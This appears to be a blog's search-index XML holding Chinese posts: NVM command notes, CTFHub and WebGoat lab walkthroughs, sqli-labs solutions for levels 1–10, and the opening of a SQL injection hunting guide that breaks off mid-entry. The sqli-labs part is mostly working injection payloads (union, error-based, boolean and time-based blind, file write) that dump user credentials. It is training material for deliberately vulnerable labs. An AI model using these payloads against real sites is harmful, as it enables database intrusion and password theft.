<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>前端技能 - 相关命令</title>
      <link href="/cnblogs.github.io/2025/01/05/frontEnd/%E5%89%8D%E7%AB%AF%E6%8A%80%E8%83%BD%20-%20%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"/>
      <url>/cnblogs.github.io/2025/01/05/frontEnd/%E5%89%8D%E7%AB%AF%E6%8A%80%E8%83%BD%20-%20%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h5 id="NVM-命令行"><a href="#NVM-命令行" class="headerlink" title="NVM 命令行"></a><strong>NVM 命令行</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在项目开发过程中，使用到vue框架技术，需要安装node下载项目依赖，但经常会遇到node版本不匹配而导致无法正常下载，重新安装node却又很麻烦。为解决以上问题，nvm：一款node的版本管理工具，能够管理node的安装和使用，使用简单，可下载指定node版本和切换使用不同版本，方便了node的使用。</span><br><span class="line"></span><br><span class="line">nvm ls-remote ：列出所有远程服务器的版本（官方node version list）</span><br><span class="line">nvm list (可简化为nvm ls)：列出所有已安装的 node 版本</span><br><span class="line">nvm list available ：显示所有可下载的版本</span><br><span class="line">nvm install stable ：安装最新版 node</span><br><span class="line">nvm install [node版本号] ：安装指定版本 node</span><br><span class="line">nvm uninstall [node版本号] ：删除已安装的指定版本</span><br><span class="line">nvm use [node版本号] ：切换到指定版本 node</span><br><span class="line">nvm current ：当前 node 版本 nvm alias [别名] [node版本号] ：给不同的版本号添加别名</span><br><span class="line">nvm unalias [别名] ：删除已定义的别名 nvm alias default [node版本号] ：设置默认版本</span><br></pre></td></tr></table></figure><p><a href="https://github.com/coreybutler/nvm-windows/releases">NVM下载</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络靶场 - CTFHub</title>
      <link href="/cnblogs.github.io/2025/01/05/hacker/online/range/CTFHub/CTFHub/"/>
      <url>/cnblogs.github.io/2025/01/05/hacker/online/range/CTFHub/CTFHub/</url>
      
        <content type="html"><![CDATA[<h3 id="技能树"><a href="#技能树" class="headerlink" title="技能树"></a><strong>技能树</strong></h3><h4 id="WEB前置技能"><a href="#WEB前置技能" class="headerlink" title="WEB前置技能"></a><strong>WEB前置技能</strong></h4><h5 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a><strong>HTTP协议</strong></h5><h6 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a><strong>请求方式</strong></h6><p><img src="https://s2.loli.net/2025/01/05/Y8liGIxr27pvLJU.png" alt="CTFHub--WEB-HTTP-_1.png"><br><img src="https://s2.loli.net/2025/01/05/WvBCPqD8R3r5j74.png" alt="CTFHub--WEB-HTTP-_2.png"><br>得到提示，如果请求方法为CTFHUB，那么会得到flag<br>使用burp抓包进行修改GET为CTFHUB,得到flag<br><img src="https://s2.loli.net/2025/01/05/Tdtj9kuelKUaCRp.png" alt="CTFHub--WEB-HTTP-_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场通关秘籍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地靶场 - webgoat通关秘籍</title>
      <link href="/cnblogs.github.io/2025/01/05/hacker/local/range/webgoat/webgoat%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/"/>
      <url>/cnblogs.github.io/2025/01/05/hacker/local/range/webgoat/webgoat%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="General"><a href="#General" class="headerlink" title="General"></a><strong>General</strong></h3><h5 id="HTTP-Basics-第二题"><a href="#HTTP-Basics-第二题" class="headerlink" title="HTTP Basics 第二题"></a><strong>HTTP Basics 第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/05/qZrLHy9OVpRX1KU.png" alt="HTTP Basics 2_1.png"><br><img src="https://s2.loli.net/2025/01/05/cRjEqoKMUODPfFL.png" alt="HTTP Basics 2_2.png"><br><img src="https://s2.loli.net/2025/01/05/yXhSjrdTcNxf5F6.png" alt="HTTP Basics 2_3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：fzheng</span><br></pre></td></tr></table></figure><h5 id="HTTP-Basics-第三题"><a href="#HTTP-Basics-第三题" class="headerlink" title="HTTP Basics 第三题"></a><strong>HTTP Basics 第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/05/agcojkKuLtqnIZR.png" alt="General - HTTP Basics 3_1.png"><br><img src="https://s2.loli.net/2025/01/05/pq7uzC5VAOglkev.png" alt="General - HTTP Basics 3_2.png"><br><img src="https://s2.loli.net/2025/01/05/XNZqAYvudfIGs1e.png" alt="General - HTTP Basics 3_3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用burpsuit抓包 修改magicnum参数=27</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 本地靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场通关秘籍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地靶场 - sqli-labs通关秘籍</title>
      <link href="/cnblogs.github.io/2025/01/04/hacker/local/range/sqli-labs/sqli-labs%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/"/>
      <url>/cnblogs.github.io/2025/01/04/hacker/local/range/sqli-labs/sqli-labs%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a><strong>Less-1</strong></h4><p><img src="https://s2.loli.net/2025/01/05/EjymtudP18ZKbIc.png" alt="Less-1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">判断sql语句是否是拼接，且是字符型还是数字型。</span><br><span class="line">?id=1  正确</span><br><span class="line">?id=1&#x27; 错误</span><br><span class="line"></span><br><span class="line">?id=1&#x27;--+</span><br><span class="line">?id=1&#x27;order by 3 --+</span><br><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure><h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a><strong>Less-2</strong></h4><p><img src="https://s2.loli.net/2025/01/05/uWfx8hHXdaKps1C.png" alt="Less-2"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br></pre></td></tr></table></figure><h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a><strong>Less-3</strong></h4><p><img src="https://s2.loli.net/2025/01/05/C3KXzQSpxtLelrZ.png" alt="Less-3"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在输入?id=2&#x27;的时候看到页面报错信息。可推断sql语句是单引号字符型且有括号，所以我们需要闭合单引号且也要考虑括号</span><br><span class="line">?id=2&#x27;)--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27;) order by 3--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure><h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a><strong>Less-4</strong></h4><p><img src="https://s2.loli.net/2025/01/05/jSq4lZf316QvO5J.png" alt="Less-4"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">页面报错信息得知sql语句是双引号字符型且有括号，通过以下代码进行sql注入</span><br><span class="line">?id=1&quot;)--+</span><br><span class="line"></span><br><span class="line">?id=1&quot;) order by 3--+</span><br><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure><h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a><strong>Less-5</strong></h4><p><img src="https://s2.loli.net/2025/01/05/ue2xAkWSqG7Cv4g.png" alt="Less-5"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">获取当前数据库名称</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line">获取当前数据库所有表名称</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">获取当前数据库user表所有列名称</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">#获取当前数据库user表所有username和password的值</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),32,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),63,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),94,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),125,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),156,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),187,31),0x7e),1)--+</span><br></pre></td></tr></table></figure><h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-6</strong></h4><p><img src="https://s2.loli.net/2025/01/05/1FqAmYUZ6s2HzWw.png" alt="Less-6"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">第六关和第五关是差不多的，根据页面报错信息可以猜测id参数是双引号，只需将第五关的单引号换成双引号就可以了。</span><br><span class="line"></span><br><span class="line">获取当前数据库名称</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line">获取当前数据库所有表名称</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">获取当前数据库user表所有列名称</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">#获取当前数据库user表所有username和password的值</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),32,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),63,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),94,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),125,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),156,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),187,31),0x7e),1)--+</span><br></pre></td></tr></table></figure><h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a><strong>Less-7</strong></h4><p><img src="https://s2.loli.net/2025/01/05/z7rLhZXwKe4H6ak.png" alt="Less-7"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) --+</span><br><span class="line">?id=1&#x27;)) order by 3 --+</span><br><span class="line"></span><br><span class="line">SELECT column1 FROM table_name INTO OUTFILE &#x27;file_path&#x27;</span><br><span class="line">OUTFILE命令可以将查询结果导出为文本文件,CSV文件等多种格式。</span><br><span class="line">注意：使用这个功能需要提前开启权限。你可以前往MySQL的源文件目录中，</span><br><span class="line">打开my.ini配置文件，并修改其中的`secure_file_priv=&#x27;D://&#x27;`</span><br><span class="line">参数设置为你的安全目录。(请设置为C盘以外的磁盘，避免系统权限问题。)</span><br><span class="line">修改完成并重启后在MySQL命令行中输入`show variables like &#x27;%secure%&#x27;;`查看是否设置成功。</span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) union select database(),version(),user() from dual into outfile &quot;d:\\project\\sqli-labs-master\\Less-7\\1.txt&quot; --+ </span><br><span class="line"></span><br><span class="line">执行完后，访问地址：</span><br><span class="line">http://192.168.120.139:30003/Less-7/1.txt</span><br></pre></td></tr></table></figure><h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a><strong>Less-8</strong></h4><p><img src="https://s2.loli.net/2025/01/05/S1TyqgWel2azo8R.png" alt="Less-8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注</span><br><span class="line">database()  显示数据库名称</span><br><span class="line">left(a,b)  从左侧截取a的前b位</span><br><span class="line">substr(a,b,c) 从b位置开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)    从位置b开始，截取a字符串的c位</span><br><span class="line">length()      返回字符串的长度</span><br><span class="line">Ascii()       将某个字符转换为ascii值</span><br><span class="line">char()        将ASCII码转换为对应的字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查数据库版本</span><br><span class="line">?id=1&#x27; and left(version(),1)=5 %23</span><br><span class="line">猜解数据库的长度</span><br><span class="line">?id=1&#x27; and length(database())=8 %23</span><br><span class="line">猜数据库名字</span><br><span class="line">?id=1&#x27;and left(database(),1)&gt;&#x27;a&#x27;--+</span><br><span class="line">?id=1&#x27;and left(database(),2)&gt;&#x27;sa&#x27;--+</span><br><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;80--+</span><br><span class="line">猜解表名</span><br><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+</span><br><span class="line">猜解字段名</span><br><span class="line">?id=1&#x27; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),y)=&quot;&quot;--+</span><br><span class="line">猜用户名</span><br><span class="line">?id=1&#x27; and left((select username from users limit x,1),y)=&quot;&quot;--+</span><br><span class="line">猜密码</span><br><span class="line">?id=1&#x27; and left((select password from users limit x,1),y)=&quot;&quot;--+</span><br><span class="line"></span><br><span class="line">实操脚本地址：https://github.com/Cancerking/hacker-tools/blob/main/python/sqli-lab/Less-8.py</span><br></pre></td></tr></table></figure><h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a><strong>Less-9</strong></h4><p><img src="https://s2.loli.net/2025/01/05/DEfPO3kpA5hty1G.png" alt="Less-9.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">本关是基于时间的盲注</span><br><span class="line">1、sleep(5)：延时5秒</span><br><span class="line">2、if(a,b,c)：a为条件，正确返回b，否则返回c</span><br><span class="line">   如果正确5秒后返回，错误则立即返回</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if(1=1,sleep(5),1)--+</span><br><span class="line">判断参数构造。</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;9,sleep(5),1)--+</span><br><span class="line">判断数据库名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br><span class="line"></span><br><span class="line">实操脚本地址：https://github.com/Cancerking/hacker-tools/blob/main/python/sqli-lab/Less-9.py</span><br></pre></td></tr></table></figure><h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a><strong>Less-10</strong></h4><p><img src="https://s2.loli.net/2025/01/05/I3pP4l1aDQJjqME.png" alt="Less-10.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">本关和第九关一样，只需要将单引号换成双引号。同样是基于时间的盲注</span><br><span class="line">1、sleep(5)：延时5秒</span><br><span class="line">2、if(a,b,c)：a为条件，正确返回b，否则返回c</span><br><span class="line">   如果正确5秒后返回，错误则立即返回</span><br><span class="line"></span><br><span class="line">?id=1&quot; and if(1=1,sleep(5),1)--+</span><br><span class="line">判断参数构造。</span><br><span class="line">?id=1&quot;and if(length((select database()))&gt;9,sleep(5),1)--+</span><br><span class="line">判断数据库名长度</span><br><span class="line">?id=1&quot;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br><span class="line">?id=1&quot;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">判断所有表名长度</span><br><span class="line">?id=1&quot;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br><span class="line">?id=1&quot;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&quot;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line">?id=1&quot; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&quot; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br><span class="line"></span><br><span class="line">实操脚本地址：https://github.com/Cancerking/hacker-tools/blob/main/python/sqli-lab/Less-10.py</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 本地靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场通关秘籍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB漏洞挖掘方法 - SQL注入篇</title>
      <link href="/cnblogs.github.io/2025/01/04/hacker/infiltrate/shares/WEB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95-SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/cnblogs.github.io/2025/01/04/hacker/infiltrate/shares/WEB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95-SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p><strong>常见的注入点</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET/POST/PUT/DELETE参数：常见的注入点，通常会尝试在HTTP请求的参数中注入SQL命令。</span><br><span class="line">如：http://xx.com/product.php?id=12&#x27; OR 1=1 --</span><br><span class="line">X-Forwarded-For：HTTP头部字段，通常用于伪造IP地址，但也可以用于注入SQL或XSS。</span><br><span class="line">如：X-Forwarded-For: 192.168.1.1&#x27; OR 1=1 --</span><br><span class="line">文件名：尝试通过文件上传或者文件路径访问时进行注入。</span><br></pre></td></tr></table></figure><p><strong>判断注入点</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">如：http://xx.com/product.php?id=12/(在这里添加判断)</span><br><span class="line"></span><br><span class="line">&#x27;：单引号，常见于字符串插入的地方，尤其是SQL注入。</span><br><span class="line">/：斜杠，可能用于路径遍历、注入等。</span><br><span class="line">&quot;：双引号，常用于字符串拼接。</span><br><span class="line">1/1：常用于测试SQL注入的效果，1/1返回真。</span><br><span class="line">1/0：常用于测试除零错误，触发数据库报错。</span><br><span class="line">and 1=1：常见的SQL注入测试条件，通常返回真，确认注入是否成功。</span><br><span class="line">&quot; and &quot;1&quot;=&quot;1：类似于</span><br><span class="line">and 1=1，用于测试注入成功与否。</span><br><span class="line">and 1=2：尝试返回假的条件（例如，1=2为假），验证是否会导致不同的行为。</span><br><span class="line">or 1=1：另一种常用的条件判断，若数据库返回成功则说明注入可行。</span><br><span class="line">or 1=：同样是一个条件，可能会触发SQL查询错误。</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1：注入测试，验证条件是否返回真。</span><br><span class="line">+：加号可能用于URL编码或者SQL中拼接字符串。</span><br><span class="line">-：减号，用于注释掉SQL中的后续部分。</span><br><span class="line">^：异或运算符，有时用于绕过过滤或触发错误。</span><br><span class="line">*：星号，可能用于选择所有字段，或作为乘法运算符。</span><br><span class="line">%：百分号，可能用于SQL模糊匹配或URL编码。</span><br><span class="line">/：除号，常用来触发除零错误等SQL注入。</span><br><span class="line">&lt;&lt;, &gt;&gt;：左移右移位操作符，可能用于绕过过滤或触发错误。</span><br><span class="line">||：逻辑或操作符，用于组合多个条件。</span><br><span class="line">|：按位或操作符，可能用于SQL注入或绕过过滤。</span><br><span class="line">&amp;：按位与操作符，常用于某些SQL注入攻击。</span><br><span class="line">&amp;&amp;：逻辑与操作符，组合条件判断。</span><br><span class="line">~：按位取反操作符，有时用于SQL注入。</span><br><span class="line">!：逻辑非操作符，常用于条件判断。</span><br><span class="line">@：在某些数据库中用作变量前缀，或用于其他目的。</span><br></pre></td></tr></table></figure><p><strong>注入分类</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">经典SQL注入：在输入字段中注入恶意的SQL查询语句，例如：&#x27; OR 1=1 --，绕过身份验证，返回所有记录。</span><br><span class="line">盲注（Blind SQL Injection）：</span><br><span 